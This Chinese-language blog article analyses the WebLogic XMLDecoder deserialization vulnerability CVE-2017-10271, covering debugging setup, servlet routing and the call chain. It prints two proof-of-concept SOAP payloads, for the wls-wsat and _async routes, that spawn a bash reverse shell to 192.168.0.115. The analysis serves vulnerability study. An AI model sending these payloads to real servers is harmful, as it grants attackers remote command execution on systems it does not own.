原创4ct10n合天智汇

跟进近几年weblogic漏洞分析与利用技术，进一步填补自己在Java分析技术方面的空白，本文分析近几年weblogic爆出的经典漏洞，以及调试环境。

## 0x01 Weblogic 介绍  

Weblogic是一种web服务器，在很多中小型项目中广泛使用，和tomcat一样是一种web容器，是一个基于j2ee架构的中间件。BEA
WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。近年来weblogic不断爆出了各种反序列化漏洞及补丁绕过漏洞，我也对最近的Weblogic漏洞进行分析和利用。

## 0x1 漏洞概述  

CVE-2017-3506/
CVE-2017-10271/CVE-2019-2725/CVE-2019-2729是同一个漏洞的一系列绕过（这几个漏洞的触发过程完全一样，以为本文主要介绍触发链所以任选其一），本篇主要介绍CVE-2017-10271的漏洞触发过程，反序列化部分及漏洞补丁绕过方法在其他文章中单独分析。

![v2-8719c4dde1ff034c1d6961df98fd758a_720w](https://pic2.zhimg.com/80/v2-8719c4dde1ff034c1d6961df98fd758a_720w.png)

## 0x2 分析内容  

重点分析解决在漏洞调试过中的难点

![v2-32267724d6d171f6cb899049a7fc3e2a_720w](https://pic3.zhimg.com/80/v2-32267724d6d171f6cb899049a7fc3e2a_720w.png)

一般分析WebLogic的博客没有介绍WebLogic
Servlet/Webservices机制，本篇通过路由分析Servlet调用机制，寻找漏洞点，完成漏洞利用链。

## 0x02 漏洞环境搭建  

为了方便各种漏洞调试工作，分两种情况搭建调试环境，本地和远程。分别描述这两种的搭建细节及注意点。Weblogic利用docker容器搭建<https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271>

Docker你应该会玩：[http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015050611535100001](http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015050611535100001)
复制链接去玩吧

![v2-d07d33e00015ae856f41614b2fe9dcf8_720w](https://pic2.zhimg.com/80/v2-d07d33e00015ae856f41614b2fe9dcf8_720w.png)

## 0x1 本地调试环境  

在本地安装并调试weblogic服务 Step 1 安装Weblogic 去官网下载相对应版本的Weblogic

![v2-0241925ec45bc12a5ca416d46e906cdf_720w](https://pic1.zhimg.com/80/v2-0241925ec45bc12a5ca416d46e906cdf_720w.png)

Step 2 配置项目信息

![v2-4d87842991fada89824ed113f555be65_720w](https://pic1.zhimg.com/80/v2-4d87842991fada89824ed113f555be65_720w.png)

添加Weblogic服务，把安装好的weblogic目录放在Application Server那一栏，并且输入安装时设定的用户名和密码。点击确定

Step 3 运行项目

![v2-e9bc0c41dce8745613039a00ad97243d_720w](https://pic4.zhimg.com/80/v2-e9bc0c41dce8745613039a00ad97243d_720w.png)

点击运行按钮运行项目，成功后会出现上述页面。

## 0x2 远程调试环境  

以docker虚拟环境为基础调试环境，利用客户端调试器连接部署在docker容器上的WebLogic服务。

Step 1 打开WebLogic远程调试

vi/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh

![v2-d2c58bb79bca17b44698c6a571a94f2a_720w](https://pic1.zhimg.com/80/v2-d2c58bb79bca17b44698c6a571a94f2a_720w.png)

重启docker容器Step 2 下载项目代码远程调试同样也需要代码而且最好和服务器上的代码相同，我们从docker容器中将项目代码拷贝出来

docker cp weblogic:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars`

同时将相同目录下modules目录拷出Step 3 配置idea调试器 打开右上角 Edit Configuratoins

![v2-2600b01716a3ae3c2e906000a4ed425c_720w](https://pic4.zhimg.com/80/v2-2600b01716a3ae3c2e906000a4ed425c_720w.png)

Step 4 添加库若想调试jar或war包中的内容需要把对应的jar包添加到Libraries中，右键相对应的模块代码出现下图，点击添加即可。

![v2-ee8e0735460d293f1f41caf3157f2ef2_720w](https://pic3.zhimg.com/80/v2-ee8e0735460d293f1f41caf3157f2ef2_720w.png)

添加库后的jar包和war包可以看其中反编译后的代码

![v2-3e0415174fce04115b75d21c3eefa87b_720w](https://pic4.zhimg.com/80/v2-3e0415174fce04115b75d21c3eefa87b_720w.png)

## 0x03 漏洞调试分析  

学习了网上好几篇分析文档，没有说明从一开始的web请求到漏洞触发的全过程，一般只分析了后面从servlet开始部分，而对前面寻找servlet的过程没有分析，为了更好的了解漏洞是怎么形成的，先从CVE-2017-10271开始分析，一步步寻找函数调用链，为心中的问题答疑解惑。
0x1 测试poc

利用网上公开的poc测试weblogic服务

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header> <work:WorkContext
xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.4.0"
class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array
class="java.lang.String" length="3"> <void index="0">
<string>/bin/bash</string> </void> <void index="1"> <string>-c</string>
</void> <void index="2"> <string>bash -i &ampgt&ampamp
/dev/tcp/192.168.0.115/31 0&ampgt&ampamp1</string> </void> </array> <void
method="start"/></void> </java> </work:WorkContext> </soapenv:Header>
<soapenv:Body/> </soapenv:Envelope>

![v2-b2cdba088ec878abf032c468dc9529f7_720w](https://pic1.zhimg.com/80/v2-b2cdba088ec878abf032c468dc9529f7_720w.png)

通过观察调用栈可以轻松的下断点进行调试。

## 0x2 漏洞初步调试  

第二步利用poc的调用栈将断点下在比较深的位置WorkContextXmlInputAdapter的readUTF函数，并根据poc跟踪触发过程。

![v2-bb5491843b8a01b54df764f90a204349_720w](https://pic4.zhimg.com/80/v2-bb5491843b8a01b54df764f90a204349_720w.png)

![v2-c61d13b4e3a7cab7f3025cb3b863892d_720w](https://pic1.zhimg.com/80/v2-c61d13b4e3a7cab7f3025cb3b863892d_720w.png)

参数var1是post请求内容，利用this.readHeaderOld读取post中的主题部分，继续往下跟进。

![v2-da3b75b4ac19e0de389d8aa059298aa0_720w](https://pic3.zhimg.com/80/v2-da3b75b4ac19e0de389d8aa059298aa0_720w.png)

var4变量是从post stream中读取的主体部分，也是soap协议要解析的内容。这部分代码的最后接着把xml内容封装成类继续向下传递。

下面的调用代码比较短小，放在一起查看调用链。这个点很关键WorkContextMapInterceptor的receiveRequest方法，这是不同servlet调用漏洞点的最小单元，换个说法一旦有servlet调用这个类的方法就有可能触发漏洞。

![v2-9ec1a8b5527b8d290c630e235def4d79_720w](https://pic4.zhimg.com/80/v2-9ec1a8b5527b8d290c630e235def4d79_720w.png)

![v2-14526b579673bff38c2bb7a91cd807d0_720w](https://pic4.zhimg.com/80/v2-14526b579673bff38c2bb7a91cd807d0_720w.png)

![v2-fd2850e047bd06e77846bfef4a1ab9c6_720w](https://pic4.zhimg.com/80/v2-fd2850e047bd06e77846bfef4a1ab9c6_720w.png)

![v2-4937f45739de2440b887d98cf0105eb5_720w](https://pic4.zhimg.com/80/v2-4937f45739de2440b887d98cf0105eb5_720w.png)

![v2-95eb9082863f9ef3e42347daceed3c70_720w](https://pic4.zhimg.com/80/v2-95eb9082863f9ef3e42347daceed3c70_720w.png)

最后在这里触发反序列化，将xml中的内容解析成了对象，并执行其中的恶意代码。

## 0x3 调试中思考的问题  

  1. 漏洞产生的原因及位置  

  2. url对应的路由问题  

  3. 完整触发过程是怎么样的  

漏洞产生的原因及位置

网上绝大部分文章说漏洞产生的原因是Weblogic的WLS Security组件产生了问题，存在问题的组件有wls-wsat.war和bea_wls9_async_response.war。这么说来漏洞位置在组件中了？并不是想象中的那样，具体来说漏洞产生在组件的路由中。我们先看一下其中的一个组件

![v2-f4cbea6791c76bd1d984732435a373a1_720w](https://pic2.zhimg.com/80/v2-f4cbea6791c76bd1d984732435a373a1_720w.png)

标准的web.xml url与servlet对应关系，打开其中一个servlet-class我们可以看到使用了webService
解析soap请求并且绑定了处理协议的路由。

![v2-4fe4fee2e0b8d26db03faef0f0b9ce7e_720w](https://pic4.zhimg.com/80/v2-4fe4fee2e0b8d26db03faef0f0b9ce7e_720w.png)

所以就可以这么说，漏洞并不在组件中，而在于servlet请求处理中，所以只要能出发该servlet并带有poc代码就可以触发漏洞，这个结论才是对的。还记得在上个小节中的关键类WorkContextMapInterceptor的receiveRequest方法吗？我们找到了其他的触发路由都调用了该方法进行处理soap内容

![v2-68d0d0349150bc3199cc905e081b5e92_720w](https://pic3.zhimg.com/80/v2-68d0d0349150bc3199cc905e081b5e92_720w.png)

那么从项目中发现了大量可以触发漏洞的路由。_async属于bea_wls9_async_response.war中的路由，触发代码也和wls不同，poc如下

<soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header>
<wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java
version="1.8.0_131" class="java.beans.xmlDecoder"> <void
class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="3">
<void index="0"> <string>bash</string> </void> <void index="1">
<string>-c</string> </void> <void index="2"> <string>bash -i &ampgt&ampamp
/dev/tcp/192.168.0.115/31 0&ampgt&ampamp1</string> </void> </array> <void
method="start"/></void> </java> </work:WorkContext> </soapenv:Header>
<soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body> </soapenv:Envelope>

将两个的调用栈放在一起对比可以看出一个关键的函数

![v2-d7bf087dab17fc32836393a1b19539f2_720w](https://pic4.zhimg.com/80/v2-d7bf087dab17fc32836393a1b19539f2_720w.png)

由以上可以看出漏洞出现在解析xml的函数上，触发在servlet路由上，所以找到使用WorkContextMapInterceptor的servlet就可以触发漏洞。

url对应的路由问题
在调试的时候心中有个问题，url和JAXWSServlet/BaseWSServlet是怎么对应上的。理解这个问题先要看*Servlet是怎么出来的。

![v2-1fe437fa68f4b9464cf96dba606d2759_720w](https://pic3.zhimg.com/80/v2-1fe437fa68f4b9464cf96dba606d2759_720w.png)

因为这一块不是分析重点所以简化描述过程，在StandardURLMapping的getExactOrPathMatch方法有个根据url寻找Object，首先会在matchMap中寻找一遍，找到之后就把值给var4，接着传递给var5，就会完成一次servlet查找

![v2-c1d9ff61ce444efc463e0d01a503b28a_720w](https://pic1.zhimg.com/80/v2-c1d9ff61ce444efc463e0d01a503b28a_720w.png)

将url按照/进行分批查找，例如/wls-wsat/RegistrationPortTypeRPC，会首先查找wls-wsat这个war包，然后第二次匹配包中的RegistrationPortTypeRPC类，如下图所示

![v2-5ed74742668d3f17dff37a066acbcfbe_720w](https://pic1.zhimg.com/80/v2-5ed74742668d3f17dff37a066acbcfbe_720w.png)

分析到这心中又出现了一个问题，最终生成的是 JAXWSWebAppServlet 而不是JAXWSServlet这是为什么呢？其实通过代码可以找到答案

![v2-06a0b71ce47fce97442725b3872c9c6c_720w](https://pic3.zhimg.com/80/v2-06a0b71ce47fce97442725b3872c9c6c_720w.png)

![v2-c543e628bc7fb2db39640caa9a13c539_720w](https://pic1.zhimg.com/80/v2-c543e628bc7fb2db39640caa9a13c539_720w.png)

JAXWSWebAppServlet是JAXWSServlet的子类，在子类调用自身不存在的方法时就会从父类中寻找并调用。

完整触发过程是怎么样的
完整的触发过程自然的分为两步，servlet生成和servlet调用，通过weblogic.kernel中的线程生成对应的servlet，如下表

![v2-4dd1de010e3d433ebdc2fa66820ed9ca_720w](https://pic2.zhimg.com/80/v2-4dd1de010e3d433ebdc2fa66820ed9ca_720w.png)

接着会把函数栈清空，然后调用weblogic.work线程执行servlet，从而触发在servlet中解析soap请求的xmlDecoder.readObject函数。具体过程如下图：

![v2-48345d558d24444b4971141fb75303ab_720w](https://pic1.zhimg.com/80/v2-48345d558d24444b4971141fb75303ab_720w.png)

包含payload的InputStream如下图：

![v2-139a006950bd1ccd824d6dbe5762ae37_720w](https://pic2.zhimg.com/80/v2-139a006950bd1ccd824d6dbe5762ae37_720w.png)

## 0x04 总结  

通过此次漏洞调试掌握了以下内容 1. weblogic框架调试以及intellij Idea调试技巧 2. weblogic servlet初步分析 3.
输入数据流追踪技术&漏洞触发过程分析

![v2-8cd816345c10c1a16cd0ffb1e5488dd0_720w](https://pic1.zhimg.com/80/v2-8cd816345c10c1a16cd0ffb1e5488dd0_720w.png)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

